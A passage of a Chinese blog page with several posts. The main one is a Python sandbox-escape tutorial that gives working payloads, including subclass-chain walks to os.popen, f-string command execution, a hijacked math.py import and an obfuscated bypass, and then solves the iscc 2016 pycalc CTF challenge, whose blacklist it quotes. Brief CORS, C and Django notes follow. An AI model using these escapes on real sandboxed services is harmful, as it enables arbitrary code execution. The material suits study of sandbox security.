+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class test(dict):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        print(super(test, self).keys.__class__.__call__(eval, &#39;1+1&#39;))</span><br><span class="line">        # 如果是 3.x 的话可以简写为：</span><br><span class="line">        # super().keys.__class__.__call__(eval, &#39;1+1&#39;))</span><br><span class="line">test()</span><br></pre></td></tr></table></figure>
+
+<p>上面的这些利用方式总结起来就是通过<code>__class__</code>、<code>__mro__</code>、<code>__subclasses__</code>、<code>__bases__</code>等等属性/方法去获取 <code>object</code>，再根据<code>__globals__</code>找引入的<code>__builtins__</code>或者<code>eval</code>等等能够直接被利用的库，或者找到<code>builtin_function_or_method</code>类/类型<code>__call__</code>后直接运行<code>eval</code>。</p>
+<p>最后，继承链的逃逸还有一些利用第三方库的方式，比如 <code>jinja2</code>，这类利用方式应该是叫 <code>SSTI</code>，可以看这个：<a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">传送门</a>，这里就不多说了。</p>
+<h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p>2.x 有个内建的 <code>file</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; file(&#39;key&#39;).read()</span><br><span class="line">&#39;Macr0phag3\n&#39;</span><br><span class="line">&gt;&gt;&gt; file(&#39;key&#39;, &#39;w&#39;).write(&#39;Macr0phag3&#39;)</span><br><span class="line">&gt;&gt;&gt; file(&#39;key&#39;).read()</span><br><span class="line">&#39;Macr0phag3&#39;</span><br></pre></td></tr></table></figure>
+
+<p>还有个 <code>open</code>，2.x 与 3.x 通用。</p>
+<p>还有一些库，例如：<code>types.FileType</code>(rw)、<code>platform.popen</code>(rw)、<code>linecache.getlines</code>(r)。</p>
+<p>为什么说写比读危害大呢？因为如果能写，可以将类似的文件保存为<code>math.py</code>，然后 import 进来：</p>
+<p>math.py：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">print(os.system(&#39;whoami&#39;))</span><br></pre></td></tr></table></figure>
+
+<p>调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import math</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p>这里需要注意的是，这里 py 文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在<code>sys.modules</code>中有的，这些库无法这样利用，会直接从<code>sys.modules</code>中加入，比如<code>re</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;re&#39; in sys.modules</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; &#39;math&#39; in sys.modules</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当然在<code>import re</code> 之前<code>del sys.modules[&#39;re&#39;]</code>也不是不可以…</p>
+<p>最后，这里的文件命名需要注意的地方和最开始的那个遍历测试的文件一样：由于待测试的库中有个叫 <code>test</code>的，如果把遍历测试的文件也命名为 test，会导致那个文件运行 2 次，因为自己 import 了自己。</p>
+<p>读文件暂时没什么发现特别的地方。</p>
+<p>剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; __builtins__.open(&#39;key&#39;).read()</span><br><span class="line">&#39;Macr0phag3\n&#39;</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[40](&#39;key&#39;).read()</span><br><span class="line">&#39;Macr0phag3&#39;</span><br></pre></td></tr></table></figure>
+
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>过滤<code>[</code>、<code>]</code>：这个行为不像是 oj 会做得出来的，ctf 倒是有可能出现。应对的方式就是将<code>[]</code>的功能用<code>pop</code> 、<code>__getitem__</code> 代替（实际上<code>a[0]</code>就是在内部调用了<code>a.__getitem__(0)</code> ）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(&#39;linecache&#39;).os.popen(&#39;whoami&#39;).read()</span><br><span class="line">&#39;macr0phag3\n&#39;</span><br></pre></td></tr></table></figure>
+
+<p>利用新特性：PEP 498 引入了 <code>f-string</code>，在 3.6 开始出现：<a href="https://docs.python.org/3.6/whatsnew/3.6.html#new-features" target="_blank" rel="noopener">传送门</a>，食用方式：<a href="https://docs.python.org/3.6/reference/lexical_analysis.html#f-strings" target="_blank" rel="noopener">传送门</a>。所以我们就有了一种船新的利用方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f&#39;&#123;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#125;&#39;</span><br><span class="line">macr0phag3</span><br><span class="line">&#39;0&#39;</span><br></pre></td></tr></table></figure>
+
+<p>关注每次版本增加的新特性，或许能淘到点宝贝。</p>
+<p>序列化相关：序列化也是能用来逃逸，但是关于序列化的安全问题还挺多的，如果有时间我再写一篇文章来讨论好了。</p>
+<h2 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h2><p>这个例子来自<code>iscc 2016</code>的<code>Pwn300 pycalc</code>，相当有趣：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">def banner():</span><br><span class="line">    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;</span><br><span class="line">    print &quot;   Simple calculator implemented by python   &quot;</span><br><span class="line">    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line">def getexp():</span><br><span class="line">    return raw_input(&quot;&gt;&gt;&gt; &quot;)</span><br><span class="line"></span><br><span class="line">def _hook_import_(name, *args, **kwargs):</span><br><span class="line">    module_blacklist &#x3D; [&#39;os&#39;, &#39;sys&#39;, &#39;time&#39;, &#39;bdb&#39;, &#39;bsddb&#39;, &#39;cgi&#39;,</span><br><span class="line">                        &#39;CGIHTTPServer&#39;, &#39;cgitb&#39;, &#39;compileall&#39;, &#39;ctypes&#39;, &#39;dircache&#39;,</span><br><span class="line">                        &#39;doctest&#39;, &#39;dumbdbm&#39;, &#39;filecmp&#39;, &#39;fileinput&#39;, &#39;ftplib&#39;, &#39;gzip&#39;,</span><br><span class="line">                        &#39;getopt&#39;, &#39;getpass&#39;, &#39;gettext&#39;, &#39;httplib&#39;, &#39;importlib&#39;, &#39;imputil&#39;,</span><br><span class="line">                        &#39;linecache&#39;, &#39;macpath&#39;, &#39;mailbox&#39;, &#39;mailcap&#39;, &#39;mhlib&#39;, &#39;mimetools&#39;,</span><br><span class="line">                        &#39;mimetypes&#39;, &#39;modulefinder&#39;, &#39;multiprocessing&#39;, &#39;netrc&#39;, &#39;new&#39;,</span><br><span class="line">                        &#39;optparse&#39;, &#39;pdb&#39;, &#39;pipes&#39;, &#39;pkgutil&#39;, &#39;platform&#39;, &#39;popen2&#39;, &#39;poplib&#39;,</span><br><span class="line">                        &#39;posix&#39;, &#39;posixfile&#39;, &#39;profile&#39;, &#39;pstats&#39;, &#39;pty&#39;, &#39;py_compile&#39;,</span><br><span class="line">                        &#39;pyclbr&#39;, &#39;pydoc&#39;, &#39;rexec&#39;, &#39;runpy&#39;, &#39;shlex&#39;, &#39;shutil&#39;, &#39;SimpleHTTPServer&#39;,</span><br><span class="line">                        &#39;SimpleXMLRPCServer&#39;, &#39;site&#39;, &#39;smtpd&#39;, &#39;socket&#39;, &#39;SocketServer&#39;,</span><br><span class="line">                        &#39;subprocess&#39;, &#39;sysconfig&#39;, &#39;tabnanny&#39;, &#39;tarfile&#39;, &#39;telnetlib&#39;,</span><br><span class="line">                        &#39;tempfile&#39;, &#39;Tix&#39;, &#39;trace&#39;, &#39;turtle&#39;, &#39;urllib&#39;, &#39;urllib2&#39;,</span><br><span class="line">                        &#39;user&#39;, &#39;uu&#39;, &#39;webbrowser&#39;, &#39;whichdb&#39;, &#39;zipfile&#39;, &#39;zipimport&#39;]</span><br><span class="line">    for forbid in module_blacklist:</span><br><span class="line">        if name &#x3D;&#x3D; forbid:        # don&#39;t let user import these modules</span><br><span class="line">            raise RuntimeError(&#39;No you can\&#39; import &#123;0&#125;!!!&#39;.format(forbid))</span><br><span class="line">    # normal modules can be imported</span><br><span class="line">    return __import__(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line">def sandbox_filter(command):</span><br><span class="line">    blacklist &#x3D; [&#39;exec&#39;, &#39;sh&#39;, &#39;__getitem__&#39;, &#39;__setitem__&#39;,</span><br><span class="line">                 &#39;&#x3D;&#39;, &#39;open&#39;, &#39;read&#39;, &#39;sys&#39;, &#39;;&#39;, &#39;os&#39;]</span><br><span class="line">    for forbid in blacklist:</span><br><span class="line">        if forbid in command:</span><br><span class="line">            return 0</span><br><span class="line">    return 1</span><br><span class="line"></span><br><span class="line">def sandbox_exec(command):      # sandbox user input</span><br><span class="line">    result &#x3D; 0</span><br><span class="line">    __sandboxed_builtins__ &#x3D; dict(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[&#39;__import__&#39;] &#x3D; _hook_import_    # hook import</span><br><span class="line">    del __sandboxed_builtins__[&#39;open&#39;]</span><br><span class="line">    _global &#x3D; &#123;</span><br><span class="line">        &#39;__builtins__&#39;: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line">    if sandbox_filter(command) &#x3D;&#x3D; 0:</span><br><span class="line">        print &#39;Malicious user input detected!!!&#39;</span><br><span class="line">        exit(0)</span><br><span class="line">    command &#x3D; &#39;result &#x3D; &#39; + command</span><br><span class="line">    try:</span><br><span class="line">        exec command in _global     # do calculate in a sandboxed environment</span><br><span class="line">    except Exception, e:</span><br><span class="line">        print e</span><br><span class="line">        return 0</span><br><span class="line">    result &#x3D; _global[&#39;result&#39;]  # extract the result</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">banner()</span><br><span class="line">while 1:</span><br><span class="line">    command &#x3D; getexp()</span><br><span class="line">    print sandbox_exec(command)</span><br></pre></td></tr></table></figure>
+
+<p><code>exec command in _global</code> 这一句就把很多 payload 干掉了，由于 exec 运行在自定义的全局命名空间里，这时候会处于<code>restricted execution mode</code>，这里不赘述了，感兴趣可以看这篇文章：<a href="http://tav.espians.com/paving-the-way-to-securing-the-python-interpreter.html" target="_blank" rel="noopener">传送门</a>。exec 加上定制的 globals 会使得沙箱安全很多，一些常规的 payload 是没法使用的，例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__</span><br><span class="line">restricted attribute</span><br><span class="line">&gt;&gt;&gt; getattr(getattr(__import__(&#39;types&#39;), &#39;FileType&#39;)(&#39;key&#39;), &#39;re&#39;&#39;ad&#39;)()</span><br><span class="line">file() constructor not accessible in restricted mode</span><br></pre></td></tr></table></figure>
+
+<p>不过也正是由于 exec 运行在特定的命名空间里，可以通过其他命名空间里的 <code>__builtins__</code>，比如 types 库，来执行任意命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; getattr(__import__(&#39;types&#39;).__builtins__[&#39;__tropmi__&#39;[::-1]](&#39;so&#39;[::-1]), &#39;mets&#39; &#39;ys&#39;[::-1])(&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/08/07/ssti/" data-id="ckfjo925e0007ywel2rqj6w1k" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-google-hack" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/08/07/google-hack/" class="article-date">
+  <time datetime="2020-08-07T02:16:04.000Z" itemprop="datePublished">2020-08-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/08/07/google-hack/">google hack</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>vul—漏洞</p>
+<p>poc—证明存不存在漏洞</p>
+<p>exp—漏洞利用代demo</p>
+<p>cve—漏洞编号，漏洞字典，国际上的</p>
+<p>cnvd—漏洞编号，漏洞字典，咱们自己的</p>
+<p>0day—没打补丁，没公开的漏洞</p>
+<p>shellcode—也是一种payload</p>
+<p> payload（有效攻击负载）是包含在你用于一次漏洞利用（exploit）中的ShellCode中的主要功能代码 </p>
+<p>apt—Advanced Persistent Threat  高级可持续性攻击</p>
+<p>owaspbwa，vulhub</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/08/07/google-hack/" data-id="ckfjo92550001ywelddbghu30" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-cors" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/08/06/cors/" class="article-date">
+  <time datetime="2020-08-06T03:49:03.000Z" itemprop="datePublished">2020-08-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/08/06/cors/">cors</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>面试问到数据交互的时候，经常会问跨域如何处理。大部分人都会回答JSONP，然后面试官紧接着就会问：“JSONP缺点是什么啊？”这个时候坑就来了，如果面试者说它支持GET方式，然后面试官就会追问，那如果POST方式发送请求怎么办？基础扎实一些的面试者会说，使用CORS跨域，不扎实的可能就摇摇头了。</p>
+<p>这还没结束，如果公司比较正规或者很在乎技术功底，你面试的又是重要岗位，HR还想砍你的工资，就会再补一刀，CORS跨域有什么问题呢？这时候能回答上来的就没几个了，就算是你答出来兼容性不好，需要IE10+浏览器,对方依然有话说，那兼容性怎么处理呢？应试者就没话了，要么被Pass掉，即便留下来，谈工资的时候就没底气了。</p>
+<p>CORS跨域实在是面试官pass一个人的利器。</p>
+<p>为什么会这样呢？</p>
+<p>1.遇到CORS请求的情况不多，开发者使用这个场景的很少，大部分都JSONP搞定了。</p>
+<p>2.开发者自身技能不扎实，偷懒心态，平常没有意识和意愿去提升自己的技术水平。</p>
+<p>3.相关的学习资料少、纯前端小白搭建可测试的环境难度大。</p>
+<p>面对这条拦路虎，我们今天就彻底解决掉它，让它不再是我们的软肋，而是彰显我们技术实力的亮点。</p>
+<p>首先，什么是CORS?</p>
+<p><img src="https://cdn.segmentfault.com/v-5f0a9217/global/img/squares.svg" alt="图片描述"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CORS是一个W3C标准，全称是&quot;跨域资源共享&quot;（Cross-origin resource sharing）。</span><br><span class="line">它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。</span><br></pre></td></tr></table></figure>
+
+<p>优缺点</p>
+<p>优点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.支持POST以及所有HTTP请求</span><br><span class="line">2.安全性相对JSOP更高</span><br><span class="line">3.前端要做的事儿比较少</span><br></pre></td></tr></table></figure>
+
+<p>缺点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.不兼容老版本浏览器，如IE9及其以下</span><br><span class="line">2.需要服务端支持</span><br><span class="line">3.使用起来稍微复杂了些</span><br></pre></td></tr></table></figure>
+
+<p>怎么用？</p>
+<p>前端部分：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;CORS跨域请求&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        function createCORSRequest(method, url) &#123;</span><br><span class="line">            var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">            if (&quot;withCredentials&quot; in xhr) &#123;</span><br><span class="line">                xhr.open(method, url, true);</span><br><span class="line">            &#125; else if (typeof XDomainRequest !&#x3D; &quot;undefined&quot;) &#123;</span><br><span class="line">                xhr &#x3D; new XDomainRequest();</span><br><span class="line">                xhr.open(method, url);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                xhr &#x3D; null;</span><br><span class="line">            &#125;</span><br><span class="line">            return xhr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        window.onload &#x3D; function () &#123;</span><br><span class="line">            var oBtn &#x3D; document.getElementById(&#39;btn1&#39;);</span><br><span class="line">            oBtn.onclick &#x3D; function () &#123;</span><br><span class="line">                var xhr &#x3D; createCORSRequest(&quot;get&quot;, &quot;http:&#x2F;&#x2F;wpdic.com&#x2F;cors.php&quot;);</span><br><span class="line">                if (xhr) &#123;</span><br><span class="line">                    xhr.onload &#x3D; function () &#123;</span><br><span class="line">                        var json &#x3D; JSON.parse(xhr.responseText);</span><br><span class="line">                        alert(json.a);</span><br><span class="line">                    &#125;;</span><br><span class="line">                    xhr.onerror &#x3D; function () &#123;</span><br><span class="line">                        alert(&#39;请求失败.&#39;);</span><br><span class="line">                    &#125;;</span><br><span class="line">                    xhr.send();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;获取数据&quot; id&#x3D;&quot;btn1&quot;&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意点：</p>
+<p>1.上面代码兼容IE8,因为用了XDomainRequest</p>
+<p>2.其它代码你就当成XMLHttpRequset用，别考虑什么2.0不2.0的</p>
+<p>3.如果你想post数据，可以往 xhr.send()里面搞</p>
+<p>4.这里不建议大家研究”simple methdod”之类的知识，代码弄懂了会用就行，遇到问题了再查也不晚</p>
+<p>后台部分：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#39;content-type:application:json;charset&#x3D;utf8&#39;);</span><br><span class="line">header(&#39;Access-Control-Allow-Origin:*&#39;);</span><br><span class="line">header(&#39;Access-Control-Allow-Methods:GET,POST&#39;);</span><br><span class="line">header(&#39;Access-Control-Allow-Credentials: true&#39;);</span><br><span class="line">header(&#39;Access-Control-Allow-Headers:x-requested-with,content-type&#39;);</span><br><span class="line">$str &#x3D; &#39;&#123;&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5&#125;&#39;; </span><br><span class="line">echo $str;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意点：</p>
+<p>1.Access-Control-Allow-Origin: <em>表示允许任何域名跨域访问，如果需要指定某域名才允许跨域访问，只需把Access-Control-Allow-Origin:</em>改为Access-Control-Allow-Origin:允许的域名,实际工作也要这么做2.Access-Control-Allow-Methods:GET,POST 规定允许的方法，建议控制严格些，不要随意放开DELETE之类的权限</p>
+<p>2.Access-Control-Allow-Credentials</p>
+<p>该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。</p>
+<p>最后，面试常考问题：</p>
+<p>CORS和JSONP的应用场景区别？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CORS要求浏览器(&gt;IE10)和服务器的同时支持，是跨域的根本解决方法，由浏览器自动完成。优点在于功能更加强大支持各种HTTP Method，缺点是兼容性不如JSONP。</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/08/06/cors/" data-id="ckfjo925c0005ywel3dvbat3z" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-转义字符" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/08/05/%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/" class="article-date">
+  <time datetime="2020-08-05T10:05:51.000Z" itemprop="datePublished">2020-08-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/08/05/%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/">转义字符</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#include &lt;stdio.h&gt;</p>
+<p>int main()<br>{ char s=’\x35’; //注意： \xhh为十六进制所代表的字符 （先转化为10进制，再对照ascll转化成字符） </p>
+<p>printf(“%c”,s);//输出5（16进制的35等于10进制的53，ascll表中对应字符’5’）<br>return 0;<br> } </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/08/05/%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/" data-id="ckfjo925a0004ywel5k50fpbg" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-django" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/07/31/django/" class="article-date">
+  <time datetime="2020-07-31T14:39:04.000Z" itemprop="datePublished">2020-07-31</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/31/django/">django</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>  django-admin startproject 项目名  </p>
+<p>一个项目由很多个应用组成的，每一个应用完成一个功能模块。</p>
+<p>创建应用的命令如下：</p>
+<p>python manage.py startapp 应用名</p>
+<p>注意：创建应用时需要先进入项目目录。</p>
+<p>运行： python manage.py runserver  </p>
+<p>停止      ctrl c</p>
+<p>安装</p>
+<ol>
+<li><p>在dos命令行中输入 pip 如下命令进行安装：</p>
+<p>安装最新的版本的 Django 命令如下：</p>
+<p>pip install django</p>
+<p>安装 指定版本的 Django 命令如下：</p>
+<p>pip install django==1.10.3</p>
+</li>
+</ol>
+<ol start="2">
+<li><p>使用 show 来查看当前安装的 django库</p>
+<p>pip show django</p>
+</li>
+</ol>
+<ol start="3">
+<li><p>使用pip命令来 卸载 Django</p>
+<p>pip uninstall django</p>
+</li>
+</ol>
+<p> #代表网页中的一个位置，浏览器读取后就将该位置滚动到可视区域。在网页中为位置指定标识符方法有两个，一个是利用锚点，例如<a name='page1'></a>，另外可以使用id属性，例如<div id='page2'></div>。</p>
+<p>   #是用来指导浏览器动作的，http请求中是不包括#部分的，不会发送到服务器端。因此改变location.hash部分，浏览器不会发送请求重新加载页面。</p>
+<p>   但是改变location.hash会在浏览器的访问历史中增加一个记录，使用后退键时可以回到上一个浏览位置。利用这一点就可以解决ajax中无访问状态的问题，配合#和历史记录，就可以在无刷新的ajax中顺利往返于各个访问状态。</p>
+<p><img src="C:%5CUsers%5Caaa%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200923211450992.png" alt="image-20200923211450992"></p>
+<p>下面来比较window.location.href和window.locaiton.hash的区别。</p>
+<p>​    （1）window.location.href</p>
